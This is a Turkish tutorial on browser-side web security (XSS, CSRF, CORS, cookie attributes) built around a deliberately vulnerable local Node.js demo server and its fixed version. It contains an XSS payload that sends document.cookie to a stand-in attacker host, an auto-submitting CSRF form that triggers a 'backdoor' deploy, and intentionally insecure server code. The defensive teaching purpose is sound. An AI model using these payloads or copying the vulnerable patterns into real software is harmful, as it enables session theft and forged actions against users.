# Tarayıcı tarafı: XSS, CSRF, CORS ve çerezler

Bu dersin bütün açıkları aynı yerde yaşar: **kullanıcının tarayıcısı**. Saldırgan sunucuya doğrudan saldırmaz. Kurbanın tarayıcısını, kurbanın oturumu ve yetkisiyle kendi istediği işi yapmaya ikna eder. Savunmayı anlamak için önce tarayıcının güvenlik modelinin iki temel kavramını netleştirelim.

## Origin ve site

- **Origin** = şema + host + port. `https://panel.ornek.com:443` ile `https://api.ornek.com` **farklı** origin'lerdir. Aynı kaynak politikası (Same-Origin Policy, SOP) origin üzerinden işler. Bir sayfa başka bir origin'in DOM'unu okuyamaz ve `fetch` yanıtını (CORS izni yoksa) göremez.
- **Site** = şema + kayıtlı alan adı (eTLD+1). `panel.ornek.com` ile `api.ornek.com` **aynı site**dir. Port site tanımına girmez. `SameSite` çerez özniteliği **site** üzerinden işler.

Bir ayrıntı daha: **Çerezler porta göre ayrılmaz.** Bu dersin deneylerinde `127.0.0.1:3011` ve `127.0.0.1:3014` sunucuları aynı `oturum` çerezini paylaştı. Biri giriş yapınca diğerinin çerezi değişti. Aynı host üzerinde farklı portlarda çalışan iki uygulama, birbirinin çerezlerini okuyabilir ve ezebilir. Bu, geliştirme ortamında küçük bir sürprizdir. Üretimde ise "aynı makinede iki uygulama" tasarımlarında gerçek bir risktir.

## Deney sunucusu

Sunucunun dört uç noktası var. `GUVENLI=1` ile düzeltilmiş davranışlar açılıyor:

```js
// web.mjs — AÇIKLI ÖRNEK SUNUCU (kısaltılmış): XSS, CSRF, CORS — sadece 127.0.0.1
import http from "node:http";
import crypto from "node:crypto";

const GUVENLI = process.env.GUVENLI === "1";
const KOKEN = process.env.KOKEN ?? "http://127.0.0.1:3011";
const IZINLI_ORIGINLER = new Set([KOKEN, "https://panel.ornek.com"]);
const oturumlar = new Map();   // oturumId -> { kullanici, csrf }

const kacis = (s) => s.replace(/[&<>"']/g, (c) =>
  ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" })[c]);

http.createServer(async (req, res) => {
  const url = new URL(req.url, "http://localhost");
  const oturum = oturumlar.get(cerezler(req).oturum);

  // 1) Yansıyan XSS: arama sayfası
  if (url.pathname === "/ara") {
    const q = url.searchParams.get("q") ?? "";
    const basliklar = { "content-type": "text/html; charset=utf-8" };
    if (GUVENLI || process.env.SADECE_CSP === "1") {
      const nonce = crypto.randomBytes(16).toString("base64");
      basliklar["content-security-policy"] =
        `default-src 'self'; script-src 'nonce-${nonce}' 'strict-dynamic'; object-src 'none'; base-uri 'none'; frame-ancestors 'none'`;
      res.writeHead(200, basliklar);
      const goster = GUVENLI ? kacis(q) : q;   // SADECE_CSP: kaçış unutulmuş, CSP tek savunma
      return res.end(`<h1>Arama</h1><p>Sonuç: ${goster}</p><script nonce="${nonce}">console.log("uygulama betiği çalıştı")</script>`);
    }
    res.writeHead(200, basliklar);
    return res.end(`<h1>Arama</h1><p>Sonuç: ${q}</p>`);
  }

  // 2) Giriş: oturum çerezi
  if (url.pathname === "/giris" && req.method === "POST") {
    const id = crypto.randomBytes(24).toString("base64url");
    const csrf = crypto.randomBytes(24).toString("base64url");
    oturumlar.set(id, { kullanici: "ayse", csrf });
    const cerez = GUVENLI
      ? `oturum=${id}; Path=/; HttpOnly; Secure; SameSite=Lax`
      : `oturum=${id}; Path=/${process.env.COOKIE_EK ?? ""}`;
    res.writeHead(200, { "set-cookie": cerez, "content-type": "application/json" });
    return res.end(JSON.stringify({ ok: true, csrf: GUVENLI ? csrf : undefined }));
  }

  // 3) Durum değiştiren işlem: deploy başlat
  if (url.pathname === "/deploy" && req.method === "POST") {
    if (!oturum) { res.writeHead(401); return res.end("oturum yok\n"); }
    const form = await govde(req);
    if (GUVENLI) {
      const site = req.headers["sec-fetch-site"];
      const origin = req.headers.origin;
      if (site && site !== "same-origin") { res.writeHead(403); return res.end(`reddedildi: sec-fetch-site=${site}\n`); }
      if (!site && origin && !IZINLI_ORIGINLER.has(origin)) { res.writeHead(403); return res.end(`reddedildi: origin=${origin}\n`); }
      const jeton = req.headers["x-csrf-token"] ?? form.get("csrf") ?? "";
      const a = Buffer.from(jeton), b = Buffer.from(oturum.csrf);
      if (a.length !== b.length || !crypto.timingSafeEqual(a, b)) { res.writeHead(403); return res.end("reddedildi: csrf jetonu\n"); }
    }
    // ... deploy kaydı
    res.writeHead(200, { "content-type": "text/plain; charset=utf-8" });
    return res.end(`deploy başladı: ${form.get("uygulama")} ${form.get("surum")} (${oturum.kullanici})\n`);
  }

  // 4) CORS: profil API'si
  if (url.pathname === "/api/profil") {
    const origin = req.headers.origin;
    const b = { "content-type": "application/json", "vary": "Origin" };
    if (origin && (!GUVENLI || IZINLI_ORIGINLER.has(origin))) {   // açıklı: her origin'i yansıt
      b["access-control-allow-origin"] = origin;
      b["access-control-allow-credentials"] = "true";
    }
    if (!oturum) { res.writeHead(401, b); return res.end("{}"); }
    res.writeHead(200, b);
    return res.end(JSON.stringify({ kullanici: oturum.kullanici, eposta: "ayse@ornek.com", deploylar }));
  }
  // ...
}).listen(Number(process.env.PORT ?? 3011), "127.0.0.1");
```

```bash
PORT=3011 node web.mjs &                                   # açıklı
PORT=3012 KOKEN=http://127.0.0.1:3012 GUVENLI=1 node web.mjs &   # düzeltilmiş
```

## XSS: saldırganın betiği, senin origin'inde

XSS (cross-site scripting), saldırganın JavaScript'inin **uygulamanın kendi origin'inde** çalışmasıdır. SOP'nin koruduğu her şey bu noktada saldırganın eline geçer: DOM, `HttpOnly` olmayan çerezler, `localStorage`'daki jetonlar ve kullanıcı adına yapılabilecek her istek. Üç türü vardır:

- **Yansıyan:** Girdi aynı yanıtta geri basılır. Kurban hazırlanmış bir bağlantıya tıklar.
- **Saklanan:** Girdi veritabanına yazılır ve onu görüntüleyen **herkese** sunulur (yorum, profil adı, deploy notu). Bu en tehlikeli türdür, çünkü kurbanın bir şey yapması gerekmez. Yönetici paneli bir log ya da bilet görüntülüyorsa, hedef doğrudan yöneticidir.
- **DOM tabanlı:** Sunucu hiç dahil olmaz. İstemci kodu `location.hash` gibi bir kaynağı `innerHTML` gibi bir hedefe yazar.

Açıklı sunucuya `<img>` etiketi içeren bir arama gönderelim:

```bash
curl -s -i -G "http://127.0.0.1:3011/ara" \
  --data-urlencode 'q=<img src=x onerror="fetch(`//kotu.example/c?`+document.cookie)">'
```

```text
HTTP/1.1 200 OK
content-type: text/html; charset=utf-8

<h1>Arama</h1><p>Sonuç: <img src=x onerror="fetch(`//kotu.example/c?`+document.cookie)"></p>
```

Girdi HTML olarak basıldı. Tarayıcıda gözlemlenebilir olsun diye `fetch` yerine `console.log` kullanan aynı yükü açtık. Önce giriş yapıldı, böylece çerez vardı. Konsol çıktısı:

```text
[error] Failed to load resource: the server responded with a status of 404 (Not Found)
[log] XSS çalıştı, çerez: oturum=UygIkFvzqKl3ca-azKI5hE1m4yiJuff3
```

`src=x` yüklenemedi (404), `onerror` çalıştı ve oturum çerezi okundu. Gerçek bir saldırıda bu çerez saldırganın sunucusuna gider. Saldırgan da onu kendi tarayıcısına koyup oturumu ele geçirir.

### Düzeltme 1: bağlama uygun kodlama

Düzeltilmiş sunucu, girdiyi HTML gövdesine basmadan önce kodluyor:

```bash
curl -s -G "http://127.0.0.1:3012/ara" \
  --data-urlencode 'q=<img src=x onerror="fetch(`//kotu.example/c?`+document.cookie)">'
```

```text
<h1>Arama</h1><p>Sonuç: &lt;img src=x onerror=&quot;fetch(`//kotu.example/c?`+document.cookie)&quot;&gt;</p><script nonce="uxiTQdCT7eT7OYS/TNdDoQ==">console.log("uygulama betiği çalıştı")</script>
```

Önemli kelime **bağlam**. Yukarıdaki beş karakterlik kaçış sadece HTML gövdesi ve tırnaklı öznitelik değeri için doğrudur:

| Girdinin gittiği yer | Doğru işlem | Tipik hata |
|---|---|---|
| HTML gövdesi, tırnaklı öznitelik | HTML kaçışı (`& < > " '`) | Tırnaksız öznitelik: `<div title=${x}>` boşlukla yeni öznitelik açar |
| `href`, `src`, `action` | URL şemasını **izin listesiyle** kontrol et (`https:`, `mailto:`) | `javascript:alert(1)` HTML kaçışından etkilenmez |
| `<script>` içi veri | `JSON.stringify` ve ayrıca `<` → `<` | `</script>` dizgisi JSON içinde bile betiği kapatır |
| `onclick=`, `style=` | Hiç girdi koyma | İki katmanlı ayrıştırma (HTML, sonra JS/CSS) |
| URL parametresi | `encodeURIComponent` | `&` ve `#` ile parametre ekleme |

En iyi kodlama, **elle yapılmayan** kodlamadır. Bağlamı bilen bir şablon motoru ya da React gibi bir kütüphane, girdiyi varsayılan olarak metin düğümüne yazar.

### React: varsayılan güvenli, ama kapılar var

React, JSX içindeki `{deger}`'i her zaman bir **metin düğümü** olarak oluşturur, HTML olarak ayrıştırmaz. Kaçış kapıları şunlardır:

- `dangerouslySetInnerHTML`
- `href`/`src` içine kullanıcı URL'si koymak
- `ref` ile doğrudan `innerHTML` yazmak
- SSR'da durumu `<script>` içine serileştirmek

Aşağıdaki örnekte aynı "yorum" üç şekilde gösteriliyor:

```react
import { useState } from "react";

const yuk = `<img src=x onerror="console.log('XSS çalıştı, DOM elimde: ' + document.querySelectorAll('*').length + ' eleman')"> merhaba`;

function guvenliUrl(u) {
  try {
    const p = new URL(u, location.href);
    return ["https:", "http:", "mailto:"].includes(p.protocol) ? p.href : "#";
  } catch { return "#"; }
}

export default function App() {
  const [yorum, setYorum] = useState(yuk);
  const [site, setSite] = useState("javascript:console.log('href ile XSS')");
  return (
    <div style={{ fontFamily: "sans-serif", display: "grid", gap: 8 }}>
      <textarea rows={2} value={yorum} onChange={(e) => setYorum(e.target.value)} />
      <div><b>1) Metin olarak:</b> {yorum}</div>
      <div><b>2) dangerouslySetInnerHTML:</b> <span dangerouslySetInnerHTML={{ __html: yorum }} /></div>
      <input value={site} onChange={(e) => setSite(e.target.value)} />
      <div>
        <b>3) Bağlantı:</b> <a href={site}>ham href</a> · <a href={guvenliUrl(site)}>izin listeli href</a>
        <span> → {guvenliUrl(site)}</span>
      </div>
    </div>
  );
}
```

Konsolda yalnızca 2. satırın yükü çalışır. 1. satırda etiket düz metin olarak görünür.

Bağlantılarda dikkatli ol. React 19, `javascript:` URL'lerini `href`'e yazarken engeller: Tıklandığında bir hata fırlatan bir URL ile değiştirir. Oyun alanında "ham href" bağlantısının DOM'daki değeri şu çıktı:

```text
javascript:throw new Error('React has blocked a javascript: URL as a security precaution.')
```

Yine de **buna güvenme**:

- Eski React sürümleri sadece uyarı verir.
- `<iframe src>`, `window.open(url)` ve `location.href = url` gibi React dışı yollarda böyle bir koruma yoktur.

İzin listeli `guvenliUrl` her durumda doğrudur.

HTML göstermek gerçekten gerekiyorsa (zengin metin editörü, Markdown önizleme), girdiyi **temizleyiciden** geçir. DOMPurify bilinen etiket ve özniteliklerin izin listesini uygular, olay işleyicilerini ve `javascript:` URL'lerini siler:

```js
import DOMPurify from "dompurify";
const temiz = DOMPurify.sanitize(kullaniciHtml, { USE_PROFILES: { html: true } });
<div dangerouslySetInnerHTML={{ __html: temiz }} />
```

Bunu **gösterim anında** yap, kayıt anında değil. Temizleyici kuralları güncellendiğinde eski kayıtlar da yeni kurallardan geçer. Aynı veri başka bir bağlamda (e-posta, PDF, mobil uygulama) da kullanılabilir.

### Düzeltme 2: Content Security Policy

CSP, tarayıcıya "bu sayfada hangi betikler çalışabilir" listesini verir. Kodlama unutulduğunda **ikinci katman** olur. Bunu göstermek için kaçışı kasıtlı olarak kapalı, ama CSP başlığı açık bir sunucu kullandık (`SADECE_CSP=1`). Aynı yükle tarayıcı konsolu:

```text
[error] Executing inline event handler violates the following Content Security Policy directive
        'script-src 'nonce-J6H+U+/6t0bintuGqqkhJw==' 'strict-dynamic''. ... The action has been blocked.
[log] uygulama betiği çalıştı
```

Enjekte edilen `onerror` engellendi. Sunucunun kendi `<script nonce="...">` betiği ise çalıştı. Kullanılan politika, Google'ın "strict CSP" önerisidir:

```text
default-src 'self';
script-src 'nonce-RASTGELE' 'strict-dynamic';
object-src 'none';
base-uri 'none';
frame-ancestors 'none'
```

- **`nonce-...`:** Her yanıtta **yeni**, tahmin edilemez bir değerdir. Sadece bu değeri taşıyan `<script>` etiketleri çalışır. Saldırgan nonce'u bilmediği için kendi etiketini ekleyemez. Satır içi olay işleyicileri (`onerror=`) ve `javascript:` URL'leri ise hiç çalışmaz.
- **`'strict-dynamic'`:** Güvenilen bir betiğin yüklediği betiklere de güvenilir. Bu yüzden alan adı listesi tutmak gerekmez. Alan adı listeleri (`script-src cdn.ornek.com`) sıklıkla atlatılır, çünkü izinli CDN'de bir JSONP uç noktası ya da eski bir kütüphane bulunur.
- **`base-uri 'none'`:** Enjekte edilen bir `<base href>` etiketi, göreli betik yollarını saldırganın sunucusuna yönlendiremez.
- **`frame-ancestors 'none'`:** Sayfa başka sitelerde `<iframe>` içine alınamaz. Bu, tıklama hırsızlığına (clickjacking) karşı korur ve `X-Frame-Options`'ın modern karşılığıdır.

> **İpucu:** Var olan bir uygulamaya CSP'yi doğrudan uygulamak çoğu zaman bir şeyleri kırar. Önce `Content-Security-Policy-Report-Only` başlığıyla ve bir `report-to` uç noktasıyla birkaç hafta ihlalleri topla. Satır içi betikleri nonce'lu hale getir, sonra politikayı zorunlu yap. React ve Vite uygulamalarında `index.html` içindeki betiklere nonce'u sunucu (ya da Nginx'in `sub_filter`'ı) ekler.

DOM tabanlı XSS için bir katman daha var: **Trusted Types** (`require-trusted-types-for 'script'`). Bu direktif açıkken `innerHTML`, `eval` ve `script.src` gibi tehlikeli hedeflere düz string verilemez, sadece bir politikadan geçmiş nesneler verilebilir. Böylece hedefler kod tabanında tek bir yere toplanır ve incelenebilir hale gelir. Chromium tabanlı tarayıcılarda vardır.

## Çerez öznitelikleri

```text
Set-Cookie: oturum=...; Path=/                                   ← açıklı
Set-Cookie: oturum=...; Path=/; HttpOnly; Secure; SameSite=Lax   ← düzeltilmiş
```

| Öznitelik | Ne yapar | Ne yapmaz |
|---|---|---|
| `HttpOnly` | `document.cookie` ile okunamaz. XSS çerezi **çalamaz** | XSS çerezi **kullanabilir**: Betik aynı origin'e istek atar, tarayıcı çerezi ekler |
| `Secure` | Sadece HTTPS ile gönderilir (localhost istisna) | İçerik zaten HTTPS ise ek koruma yoktur |
| `SameSite=Lax` | Siteler arası alt isteklerde (form POST, `fetch`, `<img>`) gönderilmez. Üst seviye GET gezinmelerinde gönderilir | Aynı site içindeki başka bir alt alan adından gelen saldırıyı durdurmaz |
| `SameSite=Strict` | Siteler arası hiçbir istekte gönderilmez | Kullanıcı başka siteden bağlantıyla geldiğinde "oturumu kapalı" görünür. Kullanım deneyimini bozar |
| `__Host-` öneki | Tarayıcı `Secure`, `Path=/` ve **`Domain` olmamasını** zorlar | Alt alan adlarının bu çerezi ezmesini engeller |

`HttpOnly`'nin sınırını deneyde gördük. Düzeltilmiş sunucuda giriş yapıldıktan sonra sayfa içindeki betik çerezi göremedi, ama aynı betiğin yaptığı istek başarılı oldu:

```text
{"cookie":"","profilDurum":200}
```

Yani `HttpOnly` oturum **hırsızlığını** önler ama XSS'i zararsız kılmaz. Saldırganın betiği kullanıcı açık sekmeyi kapatana kadar her şeyi kullanıcı adına yapabilir. Asıl savunma XSS'in kendisini önlemektir.

Jetonu `localStorage`'da tutmak bu yüzden daha kötüdür. `HttpOnly`'nin eşdeğeri yoktur, XSS jetonu doğrudan okur ve kendi makinesine taşır.

## CSRF: kurbanın tarayıcısı, saldırganın isteği

CSRF (cross-site request forgery) saldırısında saldırganın sayfası kurbanın tarayıcısına başka bir siteye istek attırır. Tarayıcı o sitenin çerezlerini **otomatik olarak ekler**. Saldırgan yanıtı göremez (SOP), ama görmesine gerek yoktur: İstek bir **yan etki** üretir (deploy, para transferi, e-posta değişikliği).

Saldırganın sayfası (`kotu.mjs`, `http://localhost:4000`). `localhost` ile `127.0.0.1` farklı sitelerdir, bu yüzden gerçek bir siteler arası durumu temsil eder:

```html
<h1>Bedava kupon!</h1>
<form id="f" method="POST" action="http://127.0.0.1:3011/deploy">
  <input name="uygulama" value="odeme-api"><input name="surum" value="9.9.9-arka-kapi">
</form>
<script>document.getElementById("f").submit()</script>
```

Tarayıcıda deneyler yapıldı (Chromium). Her deneyde önce hedef uygulamada giriş yapıldı, sonra saldırganın sayfası açıldı:

| Oturum çerezi | Giriş ile saldırı arası | Sonuç |
|---|---|---|
| `Path=/` (SameSite yok) | birkaç saniye | `deploy başladı: odeme-api 9.9.9-arka-kapi (ayse)` |
| `Path=/` (SameSite yok) | 2 dakika 35 saniye | `oturum yok` (401) |
| `Path=/; SameSite=Lax` | birkaç saniye | `oturum yok` (401) |

Bu tablo, tarayıcıların "varsayılan Lax" davranışının bilinen bir istisnasını gösteriyor. SameSite özniteliği **olmayan** çerezler Chromium'da Lax gibi davranır, ama yeni ayarlanmış çerezler için **2 dakikalık** bir pencere vardır ("Lax+POST"). Bu pencere, eski tip tek oturum açma (SSO) akışları kırılmasın diye tanınır ve bu süre içinde siteler arası üst seviye POST'ta çerez gönderilir. Saldırgan bunu, kurbanı önce giriş sayfasına yönlendirip hemen ardından formu göndererek kullanabilir. Firefox ve Safari'nin varsayılanları ise farklıdır. Sonuç: **Varsayılana güvenme, `SameSite`'ı açıkça ayarla.**

### SameSite yetmez: sunucu tarafı kontroller

`SameSite=Lax` siteler arası POST'u durdurur. Şu durumları ise durdurmaz:

1. **Aynı site içinden gelen saldırı:** Kullanıcı içeriği barındıran `destek.ornek.com` ya da ele geçirilmiş bir alt alan adı, `panel.ornek.com` için "aynı site"dir. Alt alan adı devralma (subdomain takeover), yani unutulmuş bir DNS kaydının boşta kalmış bir bulut kaynağını göstermesi, bu yüzden CSRF açısından da önemlidir.
2. **GET ile durum değiştirme:** Lax, üst seviye GET gezinmelerinde çerezi gönderir. `GET /deploy?surum=...` bir bağlantıyla tetiklenir. **GET hiçbir zaman durum değiştirmemeli.**

Düzeltilmiş sunucu üç sunucu tarafı kontrol uyguluyor:

- **`Sec-Fetch-Site`:** Modern tarayıcılar her isteğe bu başlığı ekler: `same-origin`, `same-site`, `cross-site` ya da `none`. Bu başlık JavaScript ile **değiştirilemez**. Durum değiştiren uç noktalarda sadece `same-origin` kabul edilir.
- **`Origin`:** Eski tarayıcılarda `Sec-Fetch-*` başlıkları yoktur. Bu durumda `Origin` başlığı izin listesiyle karşılaştırılır.
- **CSRF jetonu (synchronizer token):** Oturuma bağlı rastgele bir değerdir. Sayfa bu değeri formda ya da `X-CSRF-Token` başlığında geri gönderir. Saldırgan bu değeri bilemez, çünkü yanıtları okuyamaz. Karşılaştırma `timingSafeEqual` ile yapılır.

```bash
# saldırganın formu: tarayıcı Origin ve Sec-Fetch-Site başlıklarını ekler
curl -s -b c.txt -X POST "http://127.0.0.1:3012/deploy" \
  -H "Origin: https://kotu.example" -H "Sec-Fetch-Site: cross-site" -d "uygulama=odeme-api&surum=9.9.9-arka-kapi"
# eski tarayıcı: Sec-Fetch yok, Origin var
curl -s -b c.txt -X POST "http://127.0.0.1:3012/deploy" \
  -H "Origin: https://kotu.example" -d "uygulama=odeme-api&surum=9.9.9"
# aynı origin ama jeton yok (örneğin aynı origin'de çalışan ama jetonu bilmeyen bir yol)
curl -s -b c.txt -X POST "http://127.0.0.1:3012/deploy" \
  -H "Origin: http://127.0.0.1:3012" -H "Sec-Fetch-Site: same-origin" -d "uygulama=odeme-api&surum=2.4.1"
# meşru istek: giriş yanıtındaki jetonla
curl -s -b c.txt -X POST "http://127.0.0.1:3012/deploy" \
  -H "Sec-Fetch-Site: same-origin" -H "X-CSRF-Token: $JETON" -d "uygulama=odeme-api&surum=2.4.1"
```

```text
reddedildi: sec-fetch-site=cross-site
reddedildi: origin=https://kotu.example
reddedildi: csrf jetonu
deploy başladı: odeme-api 2.4.1 (ayse)
```

Aynı istekler açıklı sunucuda (3011) üçü de `deploy başladı` ile sonuçlandı.

> **Dikkat:** CSRF kontrolleri XSS'e karşı **hiçbir şey yapmaz**. Saldırganın betiği aynı origin'de çalıştığı için `Sec-Fetch-Site: same-origin` gönderir, jetonu da sayfadan okur. XSS, CSRF savunmalarının hepsini atlatır.

JSON API'leri için pratik bir kısayol var. Sadece `Content-Type: application/json` kabul eden ve özel bir başlık (`X-Requested-With`, `X-CSRF-Token`) isteyen bir API'ye, siteler arası bir form istek atamaz. Bir `fetch` bunu ancak CORS ön kontrolünden (preflight) geçerek yapabilir, sunucu da o origin'e izin vermiyorsa istek gönderilmez. Bu kısayol ancak CORS doğru yapılandırılmışsa çalışır. Sıradaki konu bu yüzden CORS.

## CORS: koruma değil, gevşetme

CORS bir güvenlik **önlemi değildir**. SOP'nin koyduğu kısıtı seçici olarak **gevşetme** mekanizmasıdır: "Şu origin'den gelen betikler benim yanıtlarımı okuyabilir." En yaygın hatası, gelen `Origin`'i olduğu gibi geri yansıtıp kimlik bilgilerine izin vermektir. Bu, "her site kullanıcılarımın oturumuyla API'mi okuyabilir" demektir:

```bash
curl -s -i -b c.txt "http://127.0.0.1:3011/api/profil" -H "Origin: https://kotu.example"
```

```text
HTTP/1.1 200 OK
access-control-allow-origin: https://kotu.example
access-control-allow-credentials: true
{"kullanici":"ayse","eposta":"ayse@ornek.com","deploylar":[...]}
```

Bu iki başlıkla, `kotu.example` sayfasındaki `fetch(url, { credentials: "include" })` yanıtı okuyabilir. Düzeltilmiş sunucu izin listesinde olmayan origin için hiçbir CORS başlığı eklemez:

```bash
curl -s -i -b c.txt "http://127.0.0.1:3012/api/profil" -H "Origin: https://kotu.example"
curl -s -i -b c.txt "http://127.0.0.1:3012/api/profil" -H "Origin: https://panel.ornek.com"
```

```text
HTTP/1.1 200 OK
{"kullanici":"ayse","eposta":"ayse@ornek.com","deploylar":[]}

HTTP/1.1 200 OK
access-control-allow-origin: https://panel.ornek.com
access-control-allow-credentials: true
{"kullanici":"ayse","eposta":"ayse@ornek.com","deploylar":[{"kim":"ayse","uygulama":"odeme-api","surum":"2.4.1"}]}
```

İlk yanıta dikkat. Sunucu isteği **işledi** ve veriyi **gönderdi**. Yanıtı engelleyen tarayıcıdır, başlık olmadığı için onu betiğe vermez. İki sonucu var:

- CORS bir yetkilendirme kontrolü değildir. curl ya da sunucu tarafı bir istemci yanıtı her zaman okur.
- "Basit" istekler (form türü içerikli POST) ön kontrol olmadan **gönderilir** ve yan etkileri gerçekleşir. CORS yan etkiyi değil, yanıtın okunmasını engeller. Yan etkiye karşı koruma CSRF kontrolleridir.

Yaygın CORS hataları:

| Hata | Sonuç |
|---|---|
| `Origin`'i yansıt ve `Allow-Credentials: true` | Her site oturumlu okuma yapar |
| `origin.endsWith("ornek.com")` | `kotuornek.com` geçer. `ornek.com.kotu.example` için de `includes` / zayıf regex |
| `null` origin'e izin vermek | Sandbox'lı iframe ve `data:` URL'leri `Origin: null` gönderir. Saldırgan bunu kolayca üretir |
| `Vary: Origin` eksik | Bir CDN, A origin'i için üretilen yanıtı B origin'ine sunar |
| `Access-Control-Allow-Origin: *` ve çerez | Tarayıcı bu kombinasyonu reddeder. Geliştiriciler bu yüzden yansıtmaya geçer. Asıl çözüm izin listesidir |

## Diğer yanıt başlıkları

```text
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
X-Content-Type-Options: nosniff
Referrer-Policy: strict-origin-when-cross-origin
Cross-Origin-Opener-Policy: same-origin
Permissions-Policy: camera=(), microphone=(), geolocation=()
```

- **HSTS:** Tarayıcı bu alan adına sadece HTTPS ile bağlanır, ilk HTTP isteğindeki SSL stripping saldırısı da kapanır. `includeSubDomains`'den önce bütün alt alan adlarının HTTPS sunduğundan emin ol.
- **`nosniff`:** Tarayıcı `Content-Type`'ı tahmin etmez. Yüklenen bir `.txt` dosyası betik olarak çalıştırılamaz.
- **`Referrer-Policy`:** URL'deki jetonların (şifre sıfırlama bağlantısı) üçüncü taraflara `Referer` başlığıyla sızmasını önler.
- **COOP:** `window.opener` üzerinden başka sitelerin sekmeye erişmesini keser.

Bu başlıkları uygulama kodunda değil, ortak bir katmanda ayarlamak daha güvenilirdir: Ingress/Nginx yapılandırması ya da bir ara katman (middleware). Böylece yeni bir uç nokta onları "unutamaz".

```quiz
{
  "question": "Bir uygulama oturum jetonunu HttpOnly, Secure, SameSite=Strict bir çerezde tutuyor ve her POST'ta CSRF jetonu kontrol ediyor. Yorum alanında saklanan bir XSS bulunuyor. Saldırgan ne yapabilir?",
  "options": [
    "Hiçbir şey. HttpOnly ve SameSite=Strict, XSS'i etkisiz kılar.",
    "Sadece çerezi çalabilir.",
    "Çerezi çalamaz, ama yorum sayfasını açan her kullanıcının tarayıcısında, o kullanıcı adına aynı origin'den istek atabilir. CSRF jetonunu sayfadan okuyup deploy gibi işlemleri yapabilir.",
    "Sadece kurbanın tarayıcısındaki localStorage'ı okuyabilir, sunucuya istek atamaz."
  ],
  "answer": 2,
  "explanation": "XSS aynı origin'de çalıştığı için tarayıcı her isteğe çerezi ekler. Sec-Fetch-Site da same-origin olur, CSRF jetonu ise DOM'dan okunur. HttpOnly sadece hırsızlığı önler. XSS'in önlenmesi (bağlama uygun kodlama, temizleme, CSP) zorunludur."
}
```

```quiz
{
  "question": "Bir API, `Origin` başlığını yansıtıyor ve `Access-Control-Allow-Credentials: true` döndürüyor. Ekip 'ama durum değiştiren uç noktalarımız POST ve JSON bekliyor' diyor. Bu yapılandırmanın en doğrudan riski hangisi?",
  "options": [
    "Yok. CORS sadece okumayı etkiler, yazma için CSRF kontrolü zaten var.",
    "Herhangi bir site, kullanıcının oturumuyla API'nin GET yanıtlarını (profil, jetonlar, CSRF jetonu dönen uç noktalar) okuyabilir. Okunan CSRF jetonuyla yazma işlemleri de yapılabilir.",
    "Sadece aynı site içindeki alt alan adları API'yi okuyabilir.",
    "Tarayıcı Allow-Credentials ile yansıtılan origin'i reddeder, bu yüzden risk yok."
  ],
  "answer": 1,
  "explanation": "Yansıtma ile credentials birleşince her origin oturumlu okuma yapar. CSRF jetonu bir yanıttan okunabiliyorsa, saldırgan ön kontrolü de geçer (o origin'e izin verilmiş durumda) ve jetonla yazma isteği gönderir. CORS yapılandırması CSRF savunmasının bir parçasıdır."
}
```

```lab
{
  "title": "Tarayıcı savunmalarını kendin dene",
  "steps": [
    "web.mjs'i 3011 (açıklı) ve SADECE_CSP=1 ile 3013 portunda başlat. Tarayıcıda `/ara?q=` ile bir `<script>alert(1)</script>` ve bir `<img onerror>` yükü dene. CSP'li sayfada konsoldaki ihlal mesajlarını oku.",
    "SADECE_CSP sunucusunda nonce'u sabit bir değere çevir (örneğin 'abc'). Saldırganın `<script nonce=\"abc\">` ile politikayı nasıl atlattığını gör. Nonce'un her yanıtta yeni olmasının neden şart olduğunu açıkla.",
    "kotu.mjs ile CSRF deneyini tekrarla: SameSite olmayan çerezle giriş yaptıktan hemen sonra ve 2 dakika bekledikten sonra. Ardından `COOKIE_EK='; SameSite=None'` dene (Secure olmadan tarayıcı çerezi reddetmeli). Sonra `; SameSite=None; Secure` dene.",
    "Düzeltilmiş sunucuya bir GET /deploy uç noktası ekle ve kotu.mjs'deki formu `<a href>` bağlantısına çevir. SameSite=Lax'ın üst seviye GET'te çerezi gönderdiğini doğrula.",
    "CORS kontrolünü `origin.endsWith('ornek.com')` ile yaz ve `Origin: https://kotuornek.com` ile atlat. Sonra `new URL(origin)` ile host'u ayrıştırıp tam eşleşme ve izin listesiyle düzelt."
  ]
}
```

## Özet

- XSS, saldırganın betiğinin senin origin'inde çalışmasıdır. Çerez, jeton, DOM ve kullanıcı adına istekler, yani her şey saldırgana geçer. Savunma bağlama uygun kodlamadır: HTML kaçışı, URL şeması izin listesi, `<script>` içi JSON için `<`.
- React varsayılan olarak güvenlidir. Kaçış kapıları `dangerouslySetInnerHTML`, kullanıcı URL'leri ve `innerHTML`'dir. HTML göstermek gerekiyorsa, gösterim anında DOMPurify kullan.
- Strict CSP (nonce + `strict-dynamic` + `object-src 'none'` + `base-uri 'none'`), unutulan bir kaçışı ikinci katmanda yakalar. Önce Report-Only modunda topla.
- Çerezler: `HttpOnly; Secure; SameSite=Lax`, mümkünse `__Host-` öneki. HttpOnly hırsızlığı önler, kötüye kullanımı önlemez. Çerezler porta göre ayrılmaz.
- CSRF: SameSite'ı açıkça ayarla. Chromium'daki varsayılan Lax'ın 2 dakikalık penceresini gözlemledik. Sunucu tarafında `Sec-Fetch-Site`/`Origin` kontrolü ve CSRF jetonu kullan. GET asla durum değiştirmemeli.
- CORS gevşetmedir: Origin'i yansıtma, tam eşleşmeli izin listesi kullan, `Vary: Origin` ekle, `null`'a izin verme. CORS yanıtın okunmasını engeller, isteği ve yan etkisini engellemez.
